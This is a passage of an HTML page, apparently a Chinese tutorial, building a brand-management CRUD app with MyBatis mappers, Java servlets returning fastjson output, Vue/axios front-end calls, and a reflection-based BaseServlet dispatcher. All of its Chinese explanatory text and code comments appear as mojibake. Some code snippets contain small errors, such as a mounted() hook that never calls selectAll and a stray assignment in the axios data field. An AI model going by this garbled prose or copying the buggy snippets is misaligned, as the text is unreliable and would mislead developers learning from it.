href="#1-æŸ¥è¯¢æ‰€æœ‰" class="headerlink" title="1.æŸ¥è¯¢æ‰€æœ‰"></a>1.æŸ¥è¯¢æ‰€æœ‰</h3><h4 id="éœ€æ±‚åˆ†æ"><a href="#éœ€æ±‚åˆ†æ" class="headerlink" title="éœ€æ±‚åˆ†æ"></a>éœ€æ±‚åˆ†æ</h4><ul><li>å½“é¡µé¢åŠ è½½å®Œæˆåï¼Œæ•°æ®éœ€è¦å±•ç¤ºåˆ°å‡ºæ¥ï¼Œæ‰€ä»¥éœ€è¦åœ¨Vueä¸­<code>mounted</code>æ„é€ å‡½æ•°ä¸­å†™å‘é€å¼‚æ­¥è¯·æ±‚çš„ä»£ç </li><li>å¹¶ä¸”å‘é€è¯·æ±‚æ—¶æ— éœ€æºå¸¦å‚æ•°</li><li>æœåŠ¡å™¨è¿”å›æ‰€æœ‰æ•°æ®ï¼Œå…¶æ ¼å¼ä¸ºjsonæ ¼å¼ï¼Œè¿”å›çš„å‚æ•°ç»‘å®šåˆ°vueçš„æ¨¡å‹ä¸­ï¼Œæ˜¾ç¤ºåˆ°é¡µé¢ä¸­</li></ul><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220330140534899.png" alt="image-20220330140534899"></p><h4 id="åç«¯å®ç°"><a href="#åç«¯å®ç°" class="headerlink" title="åç«¯å®ç°"></a>åç«¯å®ç°</h4><h5 id="dao"><a href="#dao" class="headerlink" title="dao"></a>dao</h5><p>åœ¨<code>com.itheima.mapper.BrandMapper</code>æ¥å£ä¸­æ·»åŠ <code>selectAll()</code>æ–¹æ³•</p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æŸ¥è¯¢æ‰€æœ‰</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><span class="hljs-comment"> */</span><span class="hljs-meta">@Select(&quot;select * from tb_brand&quot;)</span><span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span><span class="hljs-function">List&lt;Brand&gt; <span class="hljs-title">selectAll</span><span class="hljs-params">()</span></span>;</code></pre><p>ç”±äºè¡¨ä¸­æœ‰äº›å­—æ®µåå’Œå®ä½“ç±»ä¸­çš„å±æ€§åæ²¡æœ‰å¯¹åº”ï¼Œæ‰€ä»¥éœ€è¦åœ¨ <code>com/itheima/mapper/BrandMapper.xml</code> æ˜ å°„é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ç»“æœæ˜ å°„ ï¼Œä½¿ç”¨<code>resultMap</code> æ ‡ç­¾ã€‚æ˜ å°„é…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;brandResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;brand&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;brandName&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;brand_name&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;companyName&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;company_name&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span></code></pre><h5 id="service"><a href="#service" class="headerlink" title="service"></a>service</h5><p>åœ¨<code>com.itheima.mapper</code>ä¸­åˆ›å»º<code>BrandService</code>ç±»</p><pre><code class="hljs java">   <span class="hljs-comment">// è·å–sqlSessionFactory</span><span class="hljs-comment">// è¯¥ç±» å­˜æ”¾åœ¨utilåŒ…ä¸­ï¼Œå°è£…åæ–¹ä¾¿ä½¿ç”¨</span>   SqlSessionFactory sqlSessionFactory = SqlSessionFactoryUtils.getSqlSessionFactory();   <span class="hljs-comment">/**</span><span class="hljs-comment">    * æŸ¥è¯¢æ‰€æœ‰</span><span class="hljs-comment">    * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">    */</span>   <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Brand&gt; <span class="hljs-title">selectAll</span><span class="hljs-params">()</span></span>&#123;       SqlSession sqlSession = sqlSessionFactory.openSession();       <span class="hljs-comment">// è·å– BrandMapper</span>       BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);<span class="hljs-comment">// è°ƒç”¨æ–¹æ³•</span>       List&lt;Brand&gt; brands = mapper.selectAll();       sqlSession.close();       <span class="hljs-comment">// è¿”å›æŸ¥è¯¢åˆ°çš„æ•°æ®</span>       <span class="hljs-keyword">return</span> brands;   &#125;</code></pre><h5 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h5><p>åœ¨<code>com.itheima.web</code>ä¸­åˆ›å»º<code>SelectAllServlet</code>å¯ä»¥ä½¿ç”¨Ideaæä¾›çš„æ¨¡æ¿åˆ›å»ºè‡ªåŠ¨ç»§æ‰¿<code>HttpServlet</code></p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<span class="hljs-keyword">import</span> com.itheima.pojo.Brand;<span class="hljs-keyword">import</span> com.itheima.service.BrandService;<span class="hljs-keyword">import</span> jdk.nashorn.internal.ir.CallNode;<span class="hljs-keyword">import</span> javax.servlet.*;<span class="hljs-keyword">import</span> javax.servlet.http.*;<span class="hljs-keyword">import</span> javax.servlet.annotation.*;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-meta">@WebServlet(value = &quot;/selectAllServlet&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SelectAllServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-comment">// åˆ›å»ºBrandService</span>    <span class="hljs-keyword">private</span> BrandService service = <span class="hljs-keyword">new</span> BrandService();    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<span class="hljs-comment">// è°ƒç”¨BrandServiceä¸­çš„selectAllæ–¹æ³•</span>        List&lt;Brand&gt; brandList = service.selectAll();        <span class="hljs-comment">// å°†brandå¯¹è±¡è½¬æ¢ä¸ºjsonå­—ç¬¦ä¸²</span>        String string = JSON.toJSONString(brandList);<span class="hljs-comment">// è®¾ç½®å“åº”æ•°æ®ç±»å‹ä¸ºjson</span>        response.setContentType(<span class="hljs-string">&quot;text/json;charset=utf-8&quot;</span>);        <span class="hljs-comment">//å“åº”æ•°æ®</span>        response.getWriter().write(string);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        doGet(request, response);    &#125;&#125;</code></pre><h4 id="å‰ç«¯å®ç°"><a href="#å‰ç«¯å®ç°" class="headerlink" title="å‰ç«¯å®ç°"></a>å‰ç«¯å®ç°</h4><p>å‰ç«¯éœ€è¦åœ¨é¡µé¢åŠ è½½å®Œæ¯•åå‘é€ ajax è¯·æ±‚ï¼Œæ‰€ä»¥å‘é€è¯·æ±‚çš„é€»è¾‘åº”è¯¥æ”¾åœ¨ <code>mounted()</code> é’©å­å‡½æ•°ä¸­ã€‚è€Œå“åº”å›æ¥çš„æ•°æ®éœ€è¦èµ‹å€¼ç»™è¡¨æ ¼ç»‘å®šçš„æ•°æ®æ¨¡å‹ï¼Œä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºè¡¨æ ¼ç»‘å®šçš„æ•°æ®æ¨¡å‹æ˜¯ <code>brandlist</code></p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--è¡¨æ ¼--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>    &lt;el-table            :data=&quot;brandlist&quot;            style=&quot;width: 100%&quot;            :row-class-name=&quot;tableRowClassName&quot;            @selection-change=&quot;handleSelectionChange&quot;    &gt;</code></pre><p>ajaxè¯·æ±‚ä¸º</p><pre><code class="hljs javascript">methods:&#123;<span class="hljs-function"><span class="hljs-title">selectAll</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;                axios(&#123;                    method: <span class="hljs-string">&#x27;GET&#x27;</span>,                    url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/selectAll&#x27;</span>                &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;                    <span class="hljs-keyword">var</span> brandlist = response.data;                    _this.brandlist = brandlist;                &#125;)        &#125;    &#125;<span class="hljs-function"><span class="hljs-title">mounted</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-built_in">this</span>.selectAll;&#125;</code></pre><h3 id="2-æ·»åŠ åŠŸèƒ½"><a href="#2-æ·»åŠ åŠŸèƒ½" class="headerlink" title="2.æ·»åŠ åŠŸèƒ½"></a>2.æ·»åŠ åŠŸèƒ½</h3><h4 id="éœ€æ±‚åˆ†æ-1"><a href="#éœ€æ±‚åˆ†æ-1" class="headerlink" title="éœ€æ±‚åˆ†æ"></a>éœ€æ±‚åˆ†æ</h4><ul><li>ç”¨æˆ·è¯·æ±‚åå°æ—¶éœ€è¦æºå¸¦æ•°æ®ï¼Œä¸”ä¸ºpostè¯·æ±‚ï¼Œæºå¸¦çš„æ•°æ®ç±»å‹ä¸ºjsonç±»å‹</li><li>åç«¯æœåŠ¡å™¨è·å–jsonæ•°æ®åå°†å…¶è½¬æ¢ä¸ºBrandç±»å‹</li><li>æ·»åŠ æˆåŠŸåå“åº”å‰ç«¯</li></ul><h4 id="åç«¯å®ç°-1"><a href="#åç«¯å®ç°-1" class="headerlink" title="åç«¯å®ç°"></a>åç«¯å®ç°</h4><h5 id="dao-1"><a href="#dao-1" class="headerlink" title="dao"></a>dao</h5><p>åœ¨<code>BrandMapper</code>ä¸­æ·»åŠ addBrand()æ–¹æ³•</p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æ·»åŠ </span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Insert(&quot;insert into tb_brand values (null, #&#123;brandName&#125;, #&#123;companyName&#125;, #&#123;ordered&#125;,#&#123;description&#125;, #&#123;status&#125;)&quot;)</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addBrand</span><span class="hljs-params">(Brand brand)</span></span>;</code></pre><h5 id="service-1"><a href="#service-1" class="headerlink" title="service"></a>service</h5><p>åœ¨BrandServiceä¸­å®ç°addBrand()ä¸šåŠ¡é€»è¾‘æ–¹æ³•</p><pre><code class="hljs java">  <span class="hljs-comment">/**</span><span class="hljs-comment">   * æ·»åŠ </span><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> brand</span><span class="hljs-comment">   */</span>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addBrand</span><span class="hljs-params">(Brand brand)</span></span>&#123;      SqlSession sqlSession = sqlSessionFactory.openSession();      BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);      mapper.addBrand(brand);<span class="hljs-comment">// å¯¹æ•°æ®åº“çš„å¢åˆ æ”¹ è®°å¾—æäº¤äº‹åŠ¡</span>      sqlSession.commit();      sqlSession.close();  &#125;</code></pre><h5 id="servlet-1"><a href="#servlet-1" class="headerlink" title="servlet"></a>servlet</h5><p>å‰ç«¯è¯·æ±‚æ—¶æºå¸¦jsonæ•°æ®ï¼Œ<code>request.getParamter()</code>æ— æ³•è·å–ï¼Œéœ€è¦ä½¿ç”¨è·å–è¯·æ±‚ä½“çš„æ–¹æ³•<code>request.getReader()</code></p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<span class="hljs-keyword">import</span> com.itheima.pojo.Brand;<span class="hljs-keyword">import</span> com.itheima.service.BrandService;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.BufferedReader;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-meta">@WebServlet(value = &quot;/addServlet&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AddServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-keyword">private</span> BrandService service = <span class="hljs-keyword">new</span> BrandService();    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        <span class="hljs-comment">// getParamteræ— æ³•è·å–jsonæ•°æ®</span>        BufferedReader reader = request.getReader();        String line = reader.readLine();        System.out.println(line);        <span class="hljs-comment">// å°†jsonæ•°æ®è½¬æ¢ä¸ºBrandå¯¹è±¡</span>        Brand brand = JSON.parseObject(line, Brand.class);        System.out.println(brand);        service.addBrand(brand);<span class="hljs-comment">// è¿”å›çš„å“åº”æ•°æ®      </span>        response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        doGet(request, response);    &#125;&#125;</code></pre><h4 id="å‰ç«¯å®ç°-1"><a href="#å‰ç«¯å®ç°-1" class="headerlink" title="å‰ç«¯å®ç°"></a>å‰ç«¯å®ç°</h4><h5 id="æ·»åŠ çš„å¯¹è¯æ¡†"><a href="#æ·»åŠ çš„å¯¹è¯æ¡†" class="headerlink" title="æ·»åŠ çš„å¯¹è¯æ¡†"></a>æ·»åŠ çš„å¯¹è¯æ¡†</h5><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220330144307668.png" alt="image-20220330144307668"></p><p>åˆå§‹æ—¶è¯¥å¯¹è¯æ¡†ä¸ºéšè—çŠ¶æ€ï¼Œå…¶çŠ¶æ€æœ‰<code>dialogVisible</code>æ§åˆ¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ºfalse</p><pre><code class="hljs js">&lt;el-dialog        title=<span class="hljs-string">&quot;æ·»åŠ å“ç‰Œ&quot;</span>        :visible.sync=<span class="hljs-string">&quot;dialogVisible&quot;</span>        width=<span class="hljs-string">&quot;30%&quot;</span>        &gt;</code></pre><p>å½“ç‚¹å‡»æ·»åŠ æŒ‰é’®æ—¶ï¼Œå°†<code>dialogVisible</code>è®¾ç½®ä¸º<code>true</code>ï¼Œå¯¹è¯æ¡†å¼¹å‡ºï¼Œä¾¿å¯ä»¥ç¼–è¾‘æ•°æ®</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> <span class="hljs-attr">plain</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogVisible = true&quot;</span>&gt;</span>æ–°å¢<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></code></pre><h5 id="æäº¤æ•°æ®"><a href="#æäº¤æ•°æ®" class="headerlink" title="æäº¤æ•°æ®"></a>æäº¤æ•°æ®</h5><p>å¯¹è¯æ¡†å®é™…ä¸Šæ˜¯ä¸€ä¸ªformè¡¨å•ï¼Œè¯¥è¡¨å•æ•°æ®ä¸<code>brand</code>æ¨¡å‹ç»‘å®šï¼Œæ‰€ä»¥è¯·æ±‚åç«¯æ—¶æäº¤brandå³å¯</p><pre><code class="hljs js"><span class="hljs-keyword">new</span> Vue(&#123;<span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> &#123;<span class="hljs-comment">// å“ç‰Œæ¨¡å‹æ•°æ®</span>         brand: &#123;                    status: <span class="hljs-string">&#x27;&#x27;</span>,                    brandName: <span class="hljs-string">&#x27;&#x27;</span>,                    companyName: <span class="hljs-string">&#x27;&#x27;</span>,                    id:<span class="hljs-string">&quot;&quot;</span>,                    ordered:<span class="hljs-string">&quot;&quot;</span>,                    description:<span class="hljs-string">&quot;&quot;</span>                &#125;,&#125;&#125;&#125;)</code></pre><p>æäº¤å’Œå–æ¶ˆæŒ‰é’®</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addBrand&quot;</span>&gt;</span>æäº¤<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span><span class="hljs-comment">&lt;!--å–æ¶ˆ åªéœ€è¦å°†dialogVisbleè®¾ç½®ä¸ºfalseå³å¯éšè—å¯¹è¯æ¡†--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogVisible = false&quot;</span>&gt;</span>å–æ¶ˆ<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></code></pre><p><code>addBrand</code></p><pre><code class="hljs js"><span class="hljs-comment">// æ·»åŠ æ•°æ®</span>            <span class="hljs-function"><span class="hljs-title">addBrand</span>(<span class="hljs-params"></span>)</span>&#123;                <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;                <span class="hljs-built_in">this</span>.currentPage=<span class="hljs-number">1</span>                axios(&#123;                    method: <span class="hljs-string">&#x27;post&#x27;</span>,                    url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/add&#x27;</span>,                    data: brand = _this.brand                &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;                    <span class="hljs-keyword">if</span>(response.data == <span class="hljs-string">&quot;success&quot;</span>)&#123;                    <span class="hljs-comment">// éšè—å¯¹è¯æ¡†</span>                        _this.dialogVisible = <span class="hljs-literal">false</span>;                        <span class="hljs-comment">// é‡æ–°åŠ è½½å…¨éƒ¨æ•°æ®</span>                        _this.selectAll();                        _this.msgbox(<span class="hljs-string">&quot;æ·»åŠ æˆåŠŸï¼&quot;</span>);                    &#125;                &#125;)            &#125;</code></pre><h3 id="Servletä¼˜åŒ–"><a href="#Servletä¼˜åŒ–" class="headerlink" title="Servletä¼˜åŒ–"></a>Servletä¼˜åŒ–</h3><p>===Web å±‚çš„ Servlet ä¸ªæ•°å¤ªå¤šäº†ï¼Œä¸åˆ©äºç®¡ç†å’Œç¼–å†™===</p><p>é€šè¿‡ä¹‹å‰çš„ä¸¤ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬å‘ç°æ¯ä¸€ä¸ªåŠŸèƒ½éƒ½éœ€è¦å®šä¹‰ä¸€ä¸ª <code>servlet</code>ï¼Œä¸€ä¸ªæ¨¡å—éœ€è¦å®ç°å¢åˆ æ”¹æŸ¥åŠŸèƒ½ï¼Œå°±éœ€è¦4ä¸ª <code>servlet</code>ï¼Œæ¨¡å—ä¸€å¤šå°±ä¼šé€ æˆ<code>servlet</code> æ³›æ»¥ã€‚æ­¤æ—¶æˆ‘ä»¬å°±æƒ³ <code>servlet</code> èƒ½ä¸èƒ½åƒ <code>service</code> ä¸€æ ·ï¼Œä¸€ä¸ªæ¨¡å—åªå®šä¹‰ä¸€ä¸ª <code>servlet</code>ï¼Œè€Œæ¯ä¸€ä¸ªåŠŸèƒ½åªéœ€è¦åœ¨è¯¥ <code>servlet</code> ä¸­å®šä¹‰å¯¹åº”çš„æ–¹æ³•ã€‚ä¾‹å¦‚ä¸‹é¢ä»£ç ï¼š</p><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/brand/*&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BrandServlet</span> </span>&#123;    <span class="hljs-comment">//æŸ¥è¯¢æ‰€æœ‰</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectAll</span><span class="hljs-params">(...)</span> </span>&#123;&#125;        <span class="hljs-comment">//æ·»åŠ æ•°æ®</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(...)</span> </span>&#123;&#125;         <span class="hljs-comment">//ä¿®æ”¹æ•°æ®</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(...)</span> </span>&#123;&#125;        <span class="hljs-comment">//åˆ é™¤åˆ é™¤</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(...)</span> </span>&#123;&#125;&#125;</code></pre><p>è€Œæˆ‘ä»¬çŸ¥é“å‘é€è¯·æ±‚ <code>servlet</code>ï¼Œ<code>tomcat</code> ä¼šè‡ªåŠ¨çš„è°ƒç”¨ <code>service()</code> æ–¹æ³•ï¼Œä¹‹å‰æˆ‘ä»¬åœ¨è‡ªå®šä¹‰çš„ <code>servlet</code> ä¸­é‡å†™ <code>doGet()</code> æ–¹æ³•å’Œ <code>doPost()</code> æ–¹æ³•ï¼Œå½“æˆ‘ä»¬è®¿é—®è¯¥ <code>servlet</code> æ—¶ä¼šæ ¹æ®è¯·æ±‚æ–¹å¼å°†è¯·æ±‚åˆ†å‘ç»™ <code>doGet()</code> æˆ–è€… <code>doPost()</code>  æ–¹æ³•</p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210826184103210.png" alt="image-20210826184103210" style="zoom:80%;"><p>é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¿ç…§è¿™æ ·è¯·æ±‚åˆ†å‘çš„æ€æƒ³ï¼Œåœ¨ <code>service()</code> æ–¹æ³•ä¸­æ ¹æ®å…·ä½“çš„æ“ä½œè°ƒç”¨å¯¹åº”çš„æ–¹æ³•ï¼Œå¦‚ï¼šæŸ¥è¯¢æ‰€æœ‰å°±è°ƒç”¨ <code>selectAll()</code> æ–¹æ³•ï¼Œæ·»åŠ ä¼ä¸šä¿¡æ¯å°±è°ƒç”¨ <code>add()</code> æ–¹æ³•ã€‚</p><p>ä¸ºäº†åšåˆ°é€šç”¨ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªé€šç”¨çš„ <code>servlet</code> ç±»ï¼Œåœ¨å®šä¹‰å…¶ä»–çš„ <code>servlet</code> æ˜¯ä¸éœ€è¦ç»§æ‰¿ <code>HttpServlet</code>ï¼Œè€Œç»§æ‰¿æˆ‘ä»¬å®šä¹‰çš„ <code>BaseServlet</code>ï¼Œåœ¨<code>BaseServlet</code> ä¸­è°ƒç”¨å…·ä½“ <code>servlet</code>ï¼ˆå¦‚<code>BrandServlet</code>ï¼‰ä¸­çš„å¯¹åº”æ–¹æ³•ã€‚</p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        <span class="hljs-comment">//è¿›è¡Œè¯·æ±‚çš„åˆ†å‘</span>    &#125;&#125;</code></pre><p><code>BrandServlet</code> å®šä¹‰å°±éœ€è¦ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š</p><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/brand/*&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BrandServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseServlet</span> </span>&#123;    <span class="hljs-comment">//ç”¨æˆ·å®ç°åˆ†é¡µæŸ¥è¯¢</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectAll</span><span class="hljs-params">(...)</span> </span>&#123;&#125;         <span class="hljs-comment">//æ·»åŠ ä¼ä¸šä¿¡æ¯</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(...)</span> </span>&#123;&#125;        <span class="hljs-comment">//ä¿®æ”¹ä¼ä¸šä¿¡æ¯</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(...)</span> </span>&#123;&#125;        <span class="hljs-comment">//åˆ é™¤ä¼ä¸šä¿¡æ¯</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(...)</span> </span>&#123;&#125;&#125;</code></pre><p>é‚£ä¹ˆå¦‚ä½•åœ¨ <code>BaseServlet</code> ä¸­è°ƒç”¨å¯¹åº”çš„æ–¹æ³•å‘¢ï¼Ÿæ¯”å¦‚æŸ¥è¯¢æ‰€æœ‰å°±è°ƒç”¨ <code>selectAll()</code> æ–¹æ³•ã€‚</p><p>å¯ä»¥==è§„å®šåœ¨å‘é€è¯·æ±‚æ—¶ï¼Œè¯·æ±‚èµ„æºçš„äºŒçº§è·¯å¾„ï¼ˆ/brandServlet/selectAllï¼‰å’Œéœ€è¦è°ƒç”¨çš„æ–¹æ³•åç›¸åŒ==ï¼Œå¦‚ï¼š</p><p>æŸ¥è¯¢æ‰€æœ‰æ•°æ®çš„è·¯å¾„ä»¥åå°±éœ€è¦å†™æˆï¼š <code>http://localhost:8080/brand-case/brandServlet/selectAll</code></p><p>æ·»åŠ æ•°æ®çš„è·¯å¾„ä»¥åå°±éœ€è¦å†™æˆï¼š <code>http://localhost:8080/brand-case/brandServlet/add</code></p><p>ä¿®æ”¹æ•°æ®çš„è·¯å¾„ä»¥åå°±éœ€è¦å†™æˆï¼š <code>http://localhost:8080/brand-case/brandServlet/update</code></p><p>åˆ é™¤æ•°æ®çš„è·¯å¾„ä»¥åå°±éœ€è¦å†™æˆï¼š <code>http://localhost:8080/brand-case/brandServlet/delete</code></p><p>è¿™æ ·çš„è¯ï¼Œåœ¨ <code>BaseServlet</code> ä¸­å°±éœ€è¦è·å–åˆ°èµ„æºçš„äºŒçº§è·¯å¾„ä½œä¸ºæ–¹æ³•åï¼Œç„¶åè°ƒç”¨è¯¥æ–¹æ³•</p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        <span class="hljs-comment">//1. è·å–è¯·æ±‚è·¯å¾„</span>        String uri = req.getRequestURI(); <span class="hljs-comment">// ä¾‹å¦‚è·¯å¾„ä¸ºï¼š/brand-case/brand/selectAll</span>        <span class="hljs-comment">//2. è·å–æœ€åä¸€æ®µè·¯å¾„ï¼Œæ–¹æ³•å</span>        <span class="hljs-keyword">int</span> index = uri.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>);        String methodName = uri.substring(index + <span class="hljs-number">1</span>); <span class="hljs-comment">//  è·å–åˆ°èµ„æºçš„äºŒçº§è·¯å¾„  selectAll</span>        <span class="hljs-comment">//2. æ‰§è¡Œæ–¹æ³•</span>        <span class="hljs-comment">//2.1 è·å–BrandServlet /UserServlet å­—èŠ‚ç å¯¹è±¡ Class</span>        <span class="hljs-comment">//System.out.println(this);</span>        Class&lt;? extends BaseServlet&gt; cls = <span class="hljs-keyword">this</span>.getClass();        <span class="hljs-comment">//2.2 è·å–æ–¹æ³• Methodå¯¹è±¡</span>        <span class="hljs-keyword">try</span> &#123;            Method method = cls.getMethod(methodName,ï¼Ÿï¼Ÿï¼Ÿ);            <span class="hljs-comment">//4,è°ƒç”¨è¯¥æ–¹æ³•</span>            method.invoke(<span class="hljs-keyword">this</span>,ï¼Ÿï¼Ÿï¼Ÿ);        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;            e.printStackTrace();        &#125; <span 